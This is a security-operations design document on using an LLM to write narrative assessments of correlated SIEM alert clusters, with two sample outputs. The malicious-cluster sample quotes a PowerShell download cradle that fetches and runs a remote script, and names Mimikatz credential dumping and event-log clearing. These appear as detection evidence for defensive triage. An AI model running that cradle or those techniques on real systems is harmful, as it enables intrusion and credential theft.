# UC-12: Alert Cluster Narrative Synthesis

## Category

AI-Assisted Triage

## Summary

When a SIEM correlation rule groups multiple alerts by shared entities within a time window, the result is a cluster of related alerts — but no explanation of what the cluster means. An LLM takes the pre-correlated cluster and generates a coherent narrative: the activity chain, attack pattern mapping, an assessment of whether the cluster represents malicious, benign, or ambiguous behavior, and what the analyst should focus on. The SIEM groups them; the LLM tells the story.

## Problem Statement

Modern SIEMs are good at grouping alerts. Correlation rules identify that the same host generated 7 alerts across 4 detection rules in a 10-minute window. Threshold rules flag when a user triggers more than N alerts per hour. Entity-based grouping surfaces all alerts tied to a single entity within a time frame.

But grouping is not understanding. When an analyst opens a cluster of 7 correlated alerts, they must manually:

1. Read each alert's details and source event data
2. Reconstruct the temporal sequence of activity
3. Identify the process chain or activity flow across alerts
4. Determine whether the cluster represents a coordinated attack, a single benign automation run, or unrelated coincidental triggers
5. Map the activity to known attack patterns or benign explanations
6. Decide whether to escalate, close, or investigate further

This reconstruction is time-consuming (15-30 minutes for a complex cluster), requires experience to do well, and produces inconsistent results across analysts. Senior analysts see the pattern immediately; junior analysts may miss the connection between an encoded PowerShell download, LSASS access, and event log clearing on the same host.

The synthesis step — taking structured but disconnected alert records and producing a coherent narrative with an assessment — is a natural language reasoning task. Deterministic tooling can group the alerts and sort them chronologically, but it cannot explain what they mean together.

## Prerequisites (What Your SIEM/SOAR Should Already Handle)

- **Alert correlation rules:** The SIEM must already group related alerts by shared entities within time windows. This is a standard SIEM capability — not an AI task. Examples:
  - Elastic: EQL sequence rules, ESQL aggregation rules, or custom correlation rules using `kibana.alert.group.id`
  - Splunk: Correlation searches in Enterprise Security, `stats` by entity over time windows
  - Sentinel: Fusion rules, scheduled analytics with entity mapping, incident grouping policies
  - See [Correlation Rule Framework](../../concepts/correlation-rule-framework.md) for a production-ready multi-tier ES|QL correlation rule set that produces structured alert clusters optimized for LLM narrative synthesis
- **Entity extraction and normalization:** Alerts must contain normalized entity fields (`host.name`, `user.name`, `process.name`, `source.ip`) so the SIEM can correlate by shared entities. This is a field parsing prerequisite.
- **Alert enrichment:** Each alert in the cluster should already be enriched with available context (asset criticality, user role, threat intel). Enrichment is a SOAR playbook step, not an AI step.
- **Chronological ordering:** Alerts must have reliable timestamps for the LLM to reconstruct the activity sequence. Clock synchronization across data sources is a data engineering prerequisite.
- **Cluster delivery mechanism:** The SOAR or automation pipeline must be able to package all alerts in a cluster into a single context payload for the LLM. This is a data assembly step.

## Where AI Adds Value

The LLM performs narrative synthesis that deterministic tooling cannot produce:

1. **Activity chain reconstruction.** The LLM reads the source event data across all alerts in the cluster and constructs a coherent activity chain: "Process A spawned Process B, which accessed Resource C, then Process D cleared logs." This requires understanding process relationships, temporal sequence, and causal connections across different alert types.

2. **Attack pattern mapping.** The LLM maps the observed activity chain to known attack patterns — not just individual MITRE technique IDs (which are already in the alert metadata) but the overall pattern: "This sequence is consistent with hands-on-keyboard post-exploitation" or "This pattern matches automated vulnerability scanning, not manual attack activity."

3. **Benign vs. malicious assessment.** The LLM considers the full context to assess whether the cluster represents a genuine threat or a benign explanation. A cluster of execution + credential access + defense evasion alerts sounds alarming, but the LLM might recognize: "All process executions originate from the SCCM agent, the LSASS access is consistent with SCCM's credential delegation for software deployment, and the event log rotation is a scheduled maintenance task. Despite triggering across three MITRE tactics, this is consistent with normal SCCM deployment activity."

4. **Prioritization guidance.** The LLM identifies which alerts in the cluster are most significant and which are noise, helping the analyst focus their investigation on the critical data points.

5. **Natural language output.** The narrative is immediately consumable by analysts of all experience levels and can be included directly in incident tickets, shift handoffs, and escalation communications without rewriting.

## AI Approach

**LLM prompting with correlated alert cluster data.**

The approach uses a single-turn LLM call with a structured prompt containing the full alert cluster. No agentic behavior, no tool use — the LLM receives all the data it needs in the prompt and returns a narrative assessment.

Key design elements:

- **Cluster context package:** All alerts in the cluster are serialized into a structured format (JSON array), ordered chronologically, with source event fields and enrichment data included per alert. The package also includes metadata about the correlation criteria (which entity was shared, what time window).
- **System prompt:** Defines the narrative structure, assessment criteria, and output format. Includes instructions for:
  - Reconstructing the activity chain in temporal order
  - Identifying process parent-child relationships across alerts
  - Mapping the overall pattern to ATT&CK tactics (not just individual techniques)
  - Providing an explicit malicious/benign/ambiguous assessment with reasoning
  - Highlighting which alerts are most significant
- **Few-shot examples:** Include 2-3 examples of well-written cluster narratives covering different scenarios (true attack chain, benign automation, ambiguous activity requiring investigation).
- **Output format:** Semi-structured — a narrative summary followed by structured fields (assessment verdict, confidence, key indicators, recommended actions).

## Data Requirements

### Inputs

| Input | Format | Key Fields Used |
|---|---|---|
| Correlated alert cluster | JSON array of alert records | `rule.name`, `rule.id`, `kibana.alert.severity`, `kibana.alert.rule.threat` (MITRE), `@timestamp` per alert |
| Source event data per alert | Embedded in alert records | `process.name`, `process.command_line`, `process.parent.name`, `process.pid`, `process.parent.pid`, `file.path`, `registry.path`, `source.ip`, `destination.ip`, `event.action` |
| Correlation metadata | JSON object | Shared entity (e.g., `host.name: WKSTN-4421`), time window, correlation rule name, total alert count |
| Asset context | SOAR enrichment (JSON) | Host criticality, role, OS, business unit, installed software (if available) |
| User context | SOAR enrichment (JSON) | User role, department, privileged status, typical activity patterns |
| Historical cluster data (optional) | SIEM query results | Whether this entity has generated similar clusters before, prior assessment verdicts |

> **Note:** Alert data follows the SIEM's standard alert schema with normalized source event fields. Rule files follow their format's defined schema (Elastic TOML, Sigma YAML, Splunk YAML, etc.). These are structured, documented formats — see [data-requirements/](../../data-requirements/) for platform-specific field references.

### Outputs

The LLM produces a narrative assessment with structured metadata:

**Concrete output example — malicious cluster:**

```
## Cluster Narrative: WKSTN-4421 — 7 alerts, 4 rules, 9-minute window

### Activity Summary

Between 14:02 and 14:11 UTC on 2025-03-15, host WKSTN-4421 (workstation, user
jsmith, Marketing department) generated 7 alerts across 4 detection rules covering
execution, credential access, and defense evasion tactics.

### Activity Chain

1. **14:02:14** — [Suspicious Encoded PowerShell Command] PowerShell launched by
   explorer.exe with a Base64-encoded command line. Decoded payload:
   `IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.34/stage2.ps1')`.
   This is a standard download cradle pattern.

2. **14:03:41** — [Suspicious PowerShell Script Execution] PowerShell loaded
   `System.Reflection.Assembly` and invoked `Invoke-Mimikatz` via in-memory
   execution. No file written to disk (fileless execution).

3. **14:04:02** — [LSASS Memory Access Detected] Process `powershell.exe`
   (PID 7824) opened a handle to lsass.exe with `PROCESS_VM_READ` access rights.
   This is consistent with credential dumping via Mimikatz.

4. **14:04:03** — [LSASS Memory Access Detected] Second alert — same process,
   same target. Duplicate trigger from the same rule on continued LSASS access.

5. **14:06:18** — [Suspicious Scheduled Task Creation] schtasks.exe spawned by
   powershell.exe (PID 7824) creating task "WindowsUpdateCheck" with action
   pointing to `C:\ProgramData\updater.exe`. Persistence mechanism.

6. **14:09:55** — [Windows Event Log Cleared] wevtutil.exe spawned by
   powershell.exe (PID 7824) clearing the Security event log.

7. **14:11:02** — [Windows Event Log Cleared] Same process clearing the
   System event log.

### Attack Pattern Assessment

**Assessment: TRUE POSITIVE — HIGH CONFIDENCE**

This sequence is consistent with hands-on-keyboard post-exploitation activity.
The attack chain follows a textbook pattern:

- **Initial execution:** Encoded PowerShell download cradle fetching a remote
  payload (T1059.001 + T1105)
- **Credential access:** In-memory Mimikatz execution targeting LSASS
  (T1003.001)
- **Persistence:** Scheduled task creation with a suspicious binary path
  (T1053.005)
- **Defense evasion:** Event log clearing to cover tracks (T1070.001)

The process chain is contiguous — all activity traces back to the initial
PowerShell process (PID 7824) spawned from explorer.exe, indicating a user-
initiated or social-engineering-triggered execution. The external IP
185.220.101.34 hosting the stage2 payload is the likely C2 or staging
infrastructure.

This is NOT consistent with any known benign automation pattern. SCCM, SCOM,
and other management tools do not execute encoded download cradles from
user-context explorer.exe processes.

### Key Indicators

- Download cradle destination: 185.220.101.34
- Credential dump tool: Mimikatz (in-memory, fileless)
- Persistence binary: C:\ProgramData\updater.exe
- All activity from single process chain rooted in explorer.exe → powershell.exe (PID 7824)

### Recommended Actions

1. **IMMEDIATE:** Isolate WKSTN-4421 from the network via EDR
2. Collect full memory dump from WKSTN-4421 before reboot
3. Investigate user jsmith — was this user-initiated or was the user phished?
   Check email logs for recent suspicious attachments or links
4. Query network logs for all connections to 185.220.101.34 across the
   environment
5. Check if C:\ProgramData\updater.exe exists and collect hash for analysis
6. Search for lateral movement — query for jsmith's credentials used on
   other hosts after 14:04 UTC
7. Check if the scheduled task "WindowsUpdateCheck" has executed
```

**Concrete output example — benign cluster:**

```
## Cluster Narrative: BUILD-SVR-08 — 12 alerts, 3 rules, 5-minute window

### Activity Summary

Between 03:15 and 03:20 UTC on 2025-03-15, host BUILD-SVR-08 (build server,
service account SVC-JENKINS, DevOps) generated 12 alerts across 3 detection
rules covering execution and defense evasion tactics.

### Activity Chain

1. **03:15:02-03:15:48** — [Suspicious Encoded PowerShell Command] x6 triggers.
   All encoded payloads decode to NuGet package restore and MSBuild compilation
   commands. Parent process: jenkins.exe.
2. **03:17:11-03:18:30** — [Unsigned DLL Loaded by Trusted Process] x4 triggers.
   Build output DLLs loaded during unit test execution. All DLLs in
   D:\Jenkins\workspace\project-alpha\bin\ path.
3. **03:19:44-03:20:01** — [Suspicious Scheduled Task Creation] x2 triggers.
   Tasks created by Jenkins for build artifact cleanup. Task names follow
   Jenkins naming convention: "jenkins-cleanup-[buildid]".

### Attack Pattern Assessment

**Assessment: FALSE POSITIVE — HIGH CONFIDENCE**

This cluster is consistent with a Jenkins CI/CD pipeline build execution.
All indicators map to expected build server behavior:

- Encoded PowerShell commands are NuGet/MSBuild operations (standard CI/CD)
- Unsigned DLLs are build output artifacts in the Jenkins workspace directory
- Scheduled tasks follow Jenkins naming convention for cleanup jobs
- All activity originates from jenkins.exe parent process under SVC-JENKINS
- BUILD-SVR-08 has generated this identical pattern 847 times in the past
  90 days, correlating with the nightly build schedule

**Tuning recommendation:** Consider adding a process.parent.name: jenkins.exe
exclusion for these three rules on hosts tagged as build servers, or create a
composite exception that suppresses this specific pattern. See UC-03 for
tuning methodology.
```

## Implementation Notes

**Cluster size limits.** LLMs have context window limits, and large clusters (20+ alerts with full source event data) can exceed them. Implement a prioritization layer: if a cluster exceeds a size threshold, include the most severe alerts in full and summarize the remainder. A practical approach: include full detail for the first 10 alerts (chronologically), then include only alert metadata (rule name, timestamp, key entity values) for the rest with a note indicating truncation.

**Process chain reconstruction.** The narrative quality depends heavily on whether process parent-child relationships can be traced across alerts. This requires consistent `process.pid` and `process.parent.pid` fields. If your SIEM data doesn't reliably capture these, the LLM will reconstruct a temporal sequence but not a causal chain. EDR telemetry is typically better than native OS logging for this.

**Deduplication.** Clusters often contain duplicate or near-duplicate alerts (the same rule firing multiple times on the same activity). The SOAR playbook should deduplicate or annotate duplicate alerts before sending to the LLM. Otherwise, the narrative wastes space restating the same alert and the model may over-weight the repeated signal.

**Prompt structure for large clusters.** Organize the cluster data chronologically and group by process chain where possible. The LLM produces better narratives when the data is pre-organized rather than presented as an unsorted list of alert records.

**Caching common patterns.** If the same entity (e.g., a build server) generates identical clusters daily, consider caching the narrative assessment and only generating new narratives when the cluster composition changes. This reduces LLM API costs and latency for known benign patterns.

**Integration with incident management.** The narrative output should be written directly into the incident ticket or case notes. Design the output format to be compatible with your ticketing system's text formatting (Markdown, HTML, or plain text). This eliminates the analyst's need to manually summarize the cluster — the LLM's narrative becomes the initial incident summary.

## Dependencies

- **Prerequisite — Pillar 1 (Data Foundations):** Consistent entity fields across alert types for reliable correlation. Process tree fields (`process.pid`, `process.parent.pid`, `process.parent.name`) for chain reconstruction.
- **Prerequisite — Pillar 4 (Technology Stack):** SIEM correlation rules must be deployed and producing grouped alert clusters. The SOAR must be capable of packaging a full cluster into a single API payload.
- [UC-11: LLM Triage Verdicts](11-llm-triage-verdicts.md) — Shares the same LLM integration infrastructure. Individual alert verdicts and cluster narratives can use the same LLM endpoint with different prompts.
- [UC-03: Automated Rule Tuning Recommendations](../alert-analysis/03-automated-rule-tuning-recommendations.md) — Benign cluster patterns identified by this use case should feed into tuning recommendations.

## Complexity Assessment

| Dimension | Rating | Notes |
|---|---|---|
| Data engineering | Medium-High | Packaging a full alert cluster with source event data and enrichment into a single coherent payload requires solid SOAR engineering. Process chain reconstruction across alerts adds complexity. |
| AI/ML complexity | Medium | Single-turn LLM prompting. More complex than UC-11 because the input is larger and the narrative output requires longer-form coherent generation, but still straightforward prompt engineering. |
| Integration effort | Medium | Requires SIEM correlation rules (likely already exist), SOAR packaging step, and output routing to incident management. Fewer integration points than UC-11 since enrichment per alert may already be done. |
| Overall | **Medium-High** | The AI is medium complexity. The data engineering challenge is getting clean, complete cluster data with process chain context into a well-structured prompt. |

## Real-World Considerations

**Narrative quality depends on source event richness.** If alerts only contain rule metadata (name, severity, MITRE mapping) without the underlying source event fields (command lines, file paths, network connections), the LLM can only produce a generic narrative. The difference between "PowerShell executed" and "PowerShell executed an encoded download cradle targeting 185.220.101.34" is the difference between a useful narrative and a useless one. Ensure your alert records retain the source event fields that triggered the rule.

**Analyst calibration period.** Analysts need to learn to trust (and verify) LLM-generated narratives. Initially, analysts will re-read all alert details themselves to validate the narrative. Over time, as trust develops, analysts will use the narrative as their primary triage artifact and only dive into raw alert data when the narrative flags ambiguity. Plan for a 2-4 week calibration period.

**Cross-data-source clusters are harder.** A cluster combining endpoint alerts (Sysmon), network alerts (firewall), and identity alerts (Okta) is more valuable but harder to synthesize because the entity fields and event semantics differ across sources. The system prompt must account for cross-domain data and instruct the LLM on how to correlate entities across sources (e.g., user.name in endpoint data maps to actor.alternateId in Okta).

**False narrative risk.** The LLM may construct a plausible-sounding narrative that misrepresents the actual activity — for example, inferring a causal relationship between two alerts that are merely coincidental. Mitigations: (1) instruct the LLM to distinguish between confirmed causal chains (same PID lineage) and temporal correlation (same time window but no confirmed relationship), (2) flag uncertainty explicitly, (3) include raw alert data alongside the narrative so analysts can verify.

**Scale.** Cluster narratives are generated less frequently than individual triage verdicts (UC-11) because correlation reduces many alerts into fewer clusters. A SOC generating 1,000 alerts per day might produce 50-100 clusters. At 50-100 LLM calls per day, cost and latency are negligible.

## Related Use Cases

- [UC-11: LLM Triage Verdicts](11-llm-triage-verdicts.md) — Produces verdicts for individual alerts; cluster narratives synthesize across multiple related alerts. These can operate in parallel or sequentially (individual verdicts first, then cluster synthesis for grouped alerts).
- [UC-13: Natural Language Alert Query](13-natural-language-alert-query.md) — After reading a cluster narrative, analysts can ask follow-up questions in natural language.
- [UC-14: Agentic Investigation Execution](14-agentic-investigation-execution.md) — For high-severity clusters assessed as likely true positives, agentic investigation can automatically execute the recommended actions.
- [UC-08: Kill Chain Completeness Analysis](../posture-assessment/08-kill-chain-completeness-analysis.md) — Cluster narratives that map activity to attack stages provide empirical data on whether kill chain detection coverage works in practice.
- [UC-05: Temporal Pattern Detection](../alert-analysis/05-temporal-pattern-detection.md) — Recurring benign clusters (e.g., nightly build server patterns) identified here feed into temporal pattern analysis and tuning.

## References

- MITRE ATT&CK, "Techniques" — Reference framework for mapping observed activity chains to attacker behavior
- Elastic Security, "Correlation Rules and Alert Grouping" — SIEM-native alert clustering capabilities
- Splunk, "Correlation Searches in Enterprise Security" — SIEM-native alert clustering
- Microsoft Sentinel, "Incident Grouping and Fusion" — SIEM-native alert clustering and cross-product correlation
- Dropzone AI, "AI SOC Analyst" — Commercial implementation of alert cluster analysis
- Exaforce, "Exo Analyst" — Commercial implementation of multi-alert narrative synthesis
